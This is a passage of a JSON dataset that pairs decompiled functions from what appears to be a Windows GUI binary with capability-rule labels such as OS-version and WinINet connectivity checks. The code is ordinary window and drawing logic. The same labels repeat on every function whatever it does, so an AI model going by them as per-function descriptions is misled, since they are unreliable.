        "decompiled_code": "\nvoid fcn.00448770(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    cVar1 = fcn.004485d0();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x42) == '\\0')) {\n        uVar2 = fcn.0044870c();\n        sub.comctl32.dll_ImageList_Destroy(uVar2);\n    }\n    *(in_EAX + 0x3c) = 0;\n    fcn.0040484c();\n    return;\n}\n",
        "token_count": 128
    },
    "00448a30": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00448a30(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t *piVar3;\n    uint in_EDX;\n    uint var_28h;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = in_EDX;\n    cVar1 = fcn.004485d0();\n    if (cVar1 != '\\0') {\n        if (arg_8h == '\\0') {\n            if (*(in_EAX + 0x54) == 0) {\n                piVar3 = fcn.00429388();\n                *(in_EAX + 0x54) = piVar3;\n                fcn.0042a78c();\n                (**(*piVar3 + 0x40))();\n                (**(*piVar3 + 0x34))();\n            }\n            fcn.0042995c();\n            fcn.00424f64();\n            fcn.00418464(&var_28h, *(in_EAX + 0x30));\n            fcn.0042995c(&var_28h);\n            fcn.00425308();\n            fcn.0042995c(0, 0, 0, 0, 0xffffffff, 0, 0);\n            uVar2 = fcn.004256c0();\n            uVar2 = fcn.0044870c(var_4h, uVar2);\n            sub.comctl32.dll_ImageList_DrawEx(uVar2);\n            fcn.00418464(&var_18h, arg_10h + *(in_EAX + 0x30));\n            fcn.0042995c();\n            var_8h = fcn.004256c0();\n            fcn.00424f64();\n            uVar2 = fcn.004256c0();\n            sub.gdi32.dll_SetTextColor(uVar2, 0xffffff);\n            sub.gdi32.dll_SetBkColor(uVar2, 0);\n            sub.gdi32.dll_BitBlt\n                      (uVar2, arg_14h + 1, arg_10h + 1, *(in_EAX + 0x34), *(in_EAX + 0x30), var_8h, 0, 0, 0xe20746);\n            fcn.00424f64();\n            uVar2 = fcn.004256c0();\n            sub.gdi32.dll_SetTextColor(uVar2, 0xffffff);\n            sub.gdi32.dll_SetBkColor(uVar2, 0);\n            sub.gdi32.dll_BitBlt(uVar2, arg_14h, arg_10h, *(in_EAX + 0x34), *(in_EAX + 0x30), var_8h, 0, 0, 0xe20746);\n        }\n        else {\n            uVar2 = fcn.00448420(arg_ch);\n            fcn.00448a08(uVar2);\n            uVar2 = fcn.00448420();\n            uVar2 = fcn.004256c0(arg_14h, arg_10h, 0, 0, uVar2);\n            uVar2 = fcn.0044870c(var_4h, uVar2);\n            sub.comctl32.dll_ImageList_DrawEx(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 782
    },
    "00449234": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00449234(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    if (*(*(arg_8h + -4) + 0x20) == 0) {\n        iVar2 = fcn.00448914();\n        return 0 < iVar2;\n    }\n    cVar1 = fcn.004047dc();\n    if ((cVar1 != '\\0') && (cVar1 = fcn.00449144(),  cVar1 != '\\0')) {\n        return false;\n    }\n    return true;\n}\n",
        "token_count": 132
    },
    "004492e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004492e8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puVar3;\n    int32_t iStack112;\n    uint uStack108;\n    uchar *puStack104;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint var_40h;\n    uint var_30h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    puStack84 = 0x449305;\n    var_4h = in_EAX;\n    fcn.0041b95c();\n    puStack84 = 0x449314;\n    fcn.0041b95c();\n    puStack84 = 0x449320;\n    var_8h = fcn.00429388();\n    uStack88 = 0x44956c;\n    iStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    iVar1 = fcn.0041b730();\n    (**(*var_8h + 0x54))();\n    puStack104 = 0x449353;\n    fcn.0041b750(var_18h + iVar1, var_18h + iVar1 >> 0x1f);\n    puStack104 = 0x44935f;\n    var_10h = fcn.00429388();\n    uStack108 = 0x44954f;\n    iStack112 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff90;\n    puStack104 = &stack0xfffffffc;\n    (**(*var_10h + 0x54))();\n    var_ch = fcn.00429388();\n    (**(*var_ch + 0x40))();\n    (**(*var_ch + 0x34))();\n    var_14h = fcn.00429388();\n    fcn.0042a78c();\n    (**(*var_14h + 0x40))();\n    (**(*var_14h + 0x34))();\n    fcn.00418464(&fcn.004492e8::var_30h, *(var_4h + 0x30));\n    fcn.00449914();\n    puVar3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    iVar1 = (**(*var_8h + 0x20))();\n    iVar1 = iVar1 / *(var_4h + 0x30);\n    if (-1 < iVar1 + -1) {\n        do {\n            var_20h = iVar1;\n            if (var_1ch == 0) break;\n            iVar1 = (**(*var_8h + 0x2c))();\n            iVar1 = iVar1 / *(var_4h + 0x34);\n            if (-1 < iVar1 + -1) {\n                do {\n                    if (var_1ch == 0) break;\n                    fcn.0041848c(&fcn.004492e8::var_40h, *(var_4h + 0x30));\n                    puVar3 = &fcn.004492e8::var_40h;\n                    uVar2 = fcn.0042995c();\n                    fcn.0042995c(uVar2);\n                    fcn.004251d4(puVar3);\n                    fcn.0041848c(&fcn.004492e8::var_40h, *(var_4h + 0x30));\n                    puVar3 = &fcn.004492e8::var_40h;\n                    uVar2 = fcn.0042995c();\n                    fcn.0042995c(uVar2);\n                    fcn.004251d4(puVar3);\n                    fcn.00448848();\n                    var_1ch = var_1ch + -1;\n                    iVar1 = iVar1 + -1;\n                } while (iVar1 != 0);\n            }\n            var_20h = var_20h + -1;\n            iVar1 = var_20h;\n        } while (var_20h != 0);\n    }\n    *in_FS_OFFSET = puVar3;\n    fcn.00404650();\n    fcn.00404650();\n    fcn.00449918();\n    return;\n}\n",
        "token_count": 1032
    },
    "004497d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004497d0(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_4h;\n    \n    if (*0x49ac50 == 0) {\n        *0x49ac50 = fcn.0040e3ac();\n        if (0x5ffff < *0x49ac50) {\n            iVar1 = sub.kernel32.dll_GetModuleHandleA_2();\n            if (iVar1 != 0) {\n                *0x49ac54 = sub.kernel32.dll_GetProcAddress_1();\n            }\n        }\n    }\n    puStack40 = 0x44982f;\n    iVar1 = fcn.00420a8c(0);\n    uStack44 = 0x4498ca;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    if (*0x49ac54 == NULL) {\n        if (iVar1 != 0) {\n            iVar1 = iVar1 + 0x14;\n        }\n        puStack40 = &stack0xfffffffc;\n        uVar3 = fcn.0044870c(iVar1);\n        iVar1 = sub.comctl32.dll_ImageList_Write();\n        if (iVar1 == 0) {\n            fcn.0040dbc0();\n            fcn.00404ec4();\n        }\n    }\n    else {\n        if (iVar1 != 0) {\n            iVar1 = iVar1 + 0x14;\n        }\n        uVar3 = 1;\n        puStack40 = &stack0xfffffffc;\n        uVar2 = fcn.0044870c(1, iVar1);\n        iVar1 = (**0x49ac54)(uVar2);\n        if (iVar1 != 0) {\n            fcn.0040dbc0();\n            fcn.00404ec4();\n        }\n    }\n    *in_FS_OFFSET = uVar3;\n    uStack48 = 0x4498d1;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 475
    },
    "00449918": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00449918(void)\n\n{\n    int32_t in_EAX;\n    \n    if (0 < *(in_EAX + 0x5c)) {\n        *(in_EAX + 0x5c) = *(in_EAX + 0x5c) + -1;\n    }\n    if (*(in_EAX + 0x58) != '\\0') {\n        *(in_EAX + 0x58) = 0;\n        fcn.0040484c();\n    }\n    return;\n}\n",
        "token_count": 114
    },
    "0044a098": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0044a098(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.0041ff70();\n    uVar1 = fcn.00404620();\n    *(in_EAX + 0x30) = uVar1;\n    iVar2 = fcn.00404620();\n    *(in_EAX + 0x34) = iVar2;\n    *(iVar2 + 0xc) = in_EAX;\n    *(iVar2 + 8) = 0x44a21c;\n    *(in_EAX + 0x58) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 269
    },
    "0044a314": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0044a314(void)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint8_t uVar3;\n    int16_t iVar4;\n    int32_t in_EAX;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uStack20;\n    \n    uStack20 = uStack20 & 0xffffff00;\n    cVar2 = fcn.00437cfc();\n    if (cVar2 == '\\0') {\n        fcn.0043bbec();\n        iVar4 = fcn.00433a50();\n        if ((iVar4 != 0) && (iVar6 = *(*(in_EAX + 0x30) + 8),  -1 < iVar6 + -1)) {\n            iVar7 = 0;\n            do {\n                piVar1 = *(*(*(in_EAX + 0x30) + 4) + iVar7 * 4);\n                cVar2 = fcn.004047dc();\n                if (cVar2 != '\\0') {\n                    if (iVar4 == *(piVar1 + 0x21)) {\ncode_r0x0044a39b:\n                        uVar3 = (**(*piVar1 + 0x50))();\n                        uStack20 = uStack20 | uVar3;\n                        break;\n                    }\n                    if (piVar1[0x24] != 0) {\n                        fcn.0044abe4();\n                        iVar5 = fcn.0044ac44();\n                        if (iVar5 != -1) goto code_r0x0044a39b;\n                    }\n                }\n                iVar7 = iVar7 + 1;\n                iVar6 = iVar6 + -1;\n            } while (iVar6 != 0);\n        }\n    }\n    return CONCAT44(uStack20, uStack20) & 0xffffffff000000ff;\n}\n",
        "token_count": 419
    },
    "0044a748": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a748(uint param_1, char param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x1a) != '\\0') {\n        return;\n    }\n    *(in_EAX + 0x1a) = 1;\n    uStack28 = 0x44a840;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    if (param_2 != *(in_EAX + 0x69)) {\n        iVar4 = *(in_EAX[0x14] + 8);\n        puVar1 = &stack0xfffffffc;\n        if (-1 < iVar4 + -1) {\n            do {\n                puStack24 = puVar1;\n                piVar3 = fcn.00404800();\n                if (piVar3 != NULL) {\n                    (**(*piVar3 + 0x50))();\n                }\n                iVar4 = iVar4 + -1;\n                puVar1 = puStack24;\n            } while (iVar4 != 0);\n        }\n        *(in_EAX + 0x69) = param_2;\n        if (((0 < in_EAX[0x1b]) && (*(in_EAX + 0x69) != '\\0')) && (iVar4 = fcn.0044a1e0(),  -1 < iVar4 + -1)) {\n            do {\n                piVar3 = fcn.0044a1cc();\n                if (((piVar3 != in_EAX) && (cVar2 = fcn.004047dc(),  cVar2 != '\\0')) && (piVar3[0x1b] == in_EAX[0x1b]))\n                {\n                    fcn.0044a748();\n                }\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n        (**(*in_EAX + 0x30))();\n    }\n    *in_FS_OFFSET = uStack32;\n    *(in_EAX + 0x1a) = 0;\n    return;\n}\n",
        "token_count": 536
    },
    "0044abe4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0044abe4(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x90) == 0) {\n        uVar1 = fcn.00404620();\n        *(in_EAX + 0x90) = uVar1;\n    }\n    return *(in_EAX + 0x90);\n}\n",
        "token_count": 87
    },
    "0045acdc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045acdc(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x6c) = *(in_EAX + 0x6c) + -1;\n    if (*(in_EAX + 0x6c) < 1) {\n        *(in_EAX + 0x6c) = 0;\n        fcn.0045c884();\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "0044d2ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044d2ec(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0044d290();\n    if ((iVar1 == 0) && (*0x49ac62 != 0)) {\n        (**0x49ac60)();\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "0044d5dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0044d5dc(void)\n\n{\n    int32_t iVar1;\n    \n    sub.user32.dll_GetCapture();\n    iVar1 = fcn.0044d290();\n    if (((iVar1 != 0) && (*0x493710 != 0)) && (iVar1 == *(*0x493710 + 0x30))) {\n        iVar1 = *0x493710;\n    }\n    return iVar1;\n}\n",
        "token_count": 97
    },
    "0044d604": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044d604(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    \n    sub.user32.dll_ReleaseCapture();\n    *0x493710 = 0;\n    if ((in_EAX != 0) &&\n       ((cVar2 = fcn.004047dc(),  iVar1 = *0x493710,  cVar2 != '\\0' || (iVar1 = in_EAX,  *(in_EAX + 0x30) != 0)))) {\n        *0x493710 = iVar1;\n        uVar3 = fcn.00458594();\n        sub.user32.dll_SetCapture(uVar3);\n    }\n    return;\n}\n",
        "token_count": 164
    },
    "0044d8cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0044d8cc(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffc4;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x44d9cb;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    iVar1 = *param_2;\n    if (iVar1 < 0x216) {\n        if (iVar1 == 0x215) {\n            puStack44 = &stack0xfffffffc;\n            fcn.0044ea38();\n        }\n        else if (iVar1 == 0x200) {\n            var_10h._0_2_ = param_2[2];\n            var_ch = var_10h;\n            var_10h._2_2_ = param_2[2] >> 0x10;\n            var_8h = var_10h._2_2_;\n            in_stack_ffffffc4 = *0x49ac8c;\n            puStack44 = &stack0xfffffffc;\n            sub.user32.dll_ClientToScreen(*0x49ac8c, &var_ch);\n            fcn.0044e3a8();\n        }\n        else if (iVar1 == 0x202) {\n            puStack44 = &stack0xfffffffc;\n            fcn.0044ea38();\n        }\n        else if (iVar1 == 0x205) {\n            if (*(in_EAX + 0x38) == '\\0') {\n                puStack44 = &stack0xfffffffc;\n                fcn.0044ea38();\n            }\n            else {\n                puStack44 = &stack0xfffffffc;\n                fcn.0044ea38();\n            }\n        }\n    }\n    else if (iVar1 == 0xbd00) {\n        if (param_2[1] == 0x11) {\n            fcn.0044e3a8();\n        }\n        else if (param_2[1] == 0x1b) {\n            param_2[3] = 1;\n            puStack44 = &stack0xfffffffc;\n            fcn.0044ea38();\n        }\n    }\n    else if ((iVar1 == 0xbd01) && (param_2[1] == 0x11)) {\n        puStack44 = &stack0xfffffffc;\n        fcn.0044e3a8();\n    }\n    *in_FS_OFFSET = in_stack_ffffffc4;\n    return;\n}\n",
        "token_count": 647
    },
    "0044db08": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044db08(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *in_EAX;\n    \n    if (arg_8h == '\\0') {\n        fcn.0040484c();\n    }\n    (**(*in_EAX + 0x24))(arg_ch);\n    return;\n}\n",
        "token_count": 74
    },
    "0044dba4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0044dba4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.0044da94();\n    *(in_EAX + 0x38) = 1;\n    uVar1 = fcn.00424dbc();\n    *(in_EAX + 0x48) = uVar1;\n    fcn.0042b8b4();\n    fcn.00424f38();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 225
    },
    "0044dd9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044dd9c(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_10h;\n    \n    if (arg_8h == arg_ch[1]) {\n        uVar1 = 0;\n    }\n    else {\n        if (arg_ch[2] == 0) {\n            sub.user32.dll_GetWindowRect(arg_8h, &var_10h);\n            iVar2 = sub.user32.dll_PtInRect(&var_10h, arg_ch[3], arg_ch[4]);\n            if (iVar2 != 0) {\n                arg_ch[2] = arg_8h;\n            }\n        }\n        if (arg_8h == arg_ch[2]) {\n            uVar1 = 0;\n            *(arg_ch + 5) = 1;\n        }\n        else if (arg_8h == *arg_ch) {\n            uVar1 = 0xffffffff;\n            arg_ch[2] = 0;\n        }\n        else {\n            uVar1 = 0xffffffff;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 256
    },
    "0044de08": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.0044de08(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint lprcSrc2;\n    uint lprcSrc1;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t hWnd;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 1;\n    hWnd = fcn.0044e250();\n    iVar2 = sub.user32.dll_GetWindow(hWnd, 4);\n    if (iVar2 != *(**0x495b10 + 0x30)) {\n        iVar2 = fcn.0044d290();\n        if (iVar2 == 0) {\n            return var_1h;\n        }\n        do {\n            iVar2 = *(iVar2 + 0x30);\n        } while (iVar2 != 0);\n        hWnd = fcn.00458594();\n    }\n    if (hWnd != 0) {\n        do {\n            in_EAX = *(in_EAX + 0x30);\n        } while (in_EAX != 0);\n        var_18h = fcn.00458594();\n        if (var_18h != hWnd) {\n            iVar2 = *(*(arg_8h + -0x10) + 0x30);\n            if (iVar2 == 0) {\n                cVar1 = fcn.004047dc();\n                if (cVar1 == '\\0') {\n                    var_1ch = 0;\n                }\n                else {\n                    var_1ch = fcn.00458594();\n                }\n            }\n            else {\n                do {\n                    iVar2 = *(iVar2 + 0x30);\n                } while (iVar2 != 0);\n                var_1ch = fcn.00458594();\n            }\n            var_8h._0_1_ = '\\0';\n            var_10h = *(arg_8h + -9);\n            var_ch = *(arg_8h + -5);\n            uVar3 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.0044dd9c, &var_1ch);\n            sub.user32.dll_EnumThreadWindows(uVar3);\n            if (var_8h != '\\0') {\n                sub.user32.dll_GetWindowRect(hWnd, &lprcSrc1);\n                fcn.0040484c(arg_8h + -1, arg_8h + -9);\n                cVar1 = fcn.004047dc();\n                if ((((cVar1 == '\\0') || (*(*(*0x49ac84 + 0x40) + 0x94) == 0)) ||\n                    (iVar2 = fcn.00458594(),  iVar2 != hWnd)) &&\n                   (iVar2 = sub.user32.dll_IntersectRect(&lprcSrc1, &lprcSrc1, &lprcSrc2),  iVar2 != 0)) {\n                    var_1h._0_1_ = 0;\n                }\n            }\n        }\n    }\n    return var_1h;\n}\n",
        "token_count": 735
    },
    "0044dfe8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0044dfe8(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint lprc;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint pt;\n    uint var_5h;\n    uint var_1h;\n    \n    pt = *in_EAX;\n    var_5h = in_EAX[1];\n    var_18h = 0;\n    if (*0x49aca8 != 0) {\n        puVar5 = 0x11;\n        var_10h = param_2;\n        uVar2 = sub.user32.dll_GetKeyState(0x11);\n        if (((uVar2 & 0x8000) != 0) != *(**0x495b10 + 0xbc)) {\n            (**(**0x49acac + 8))();\n            iVar4 = *(*0x49aca8 + 8);\n            if (-1 < iVar4 + -1) {\n                do {\n                    var_14h = fcn.004198b4();\n                    if (((var_14h != var_10h) && (*(var_14h + 0x1da) != '\\0')) &&\n                       (cVar1 = (**(*var_14h + 0x50))(),  cVar1 != '\\0')) {\n                        puVar5 = fcn.00458594();\n                        iVar3 = sub.user32.dll_IsWindowVisible();\n                        if (((iVar3 != 0) && (cVar1 = fcn.0044dfa4(&var_1h + 1),  cVar1 == '\\0')) &&\n                           (cVar1 = fcn.0040484c(),  cVar1 != '\\0')) {\n                            var_1h._0_1_ = '\\x01';\n                            puVar5 = &var_1h;\n                            fcn.0040484c();\n                            if (var_1h != '\\0') {\n                                puVar5 = &lprc;\n                                iVar3 = sub.user32.dll_PtInRect();\n                                if (iVar3 != 0) {\n                                    fcn.0044d714();\n                                }\n                            }\n                        }\n                    }\n                    iVar4 = iVar4 + -1;\n                } while (iVar4 != 0);\n            }\n            if (0 < (*0x49acac)[2]) {\n                var_18h = fcn.0044d7cc(puVar5);\n            }\n            if ((var_18h != 0) && (cVar1 = fcn.0044de08(&var_1h + 1),  cVar1 == '\\0')) {\n                var_18h = 0;\n            }\n        }\n    }\n    return var_18h;\n}\n",
        "token_count": 682
    },
    "0044e13c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044e13c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX != 0) {\n        if (*0x49aca8 == 0) {\n            *0x49aca8 = fcn.00404620();\n        }\n        iVar1 = fcn.00419910();\n        if (param_2 == '\\0') {\n            if (iVar1 != -1) {\n                fcn.004197a8();\n            }\n        }\n        else if (iVar1 == -1) {\n            fcn.0041975c();\n        }\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "0044e308": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
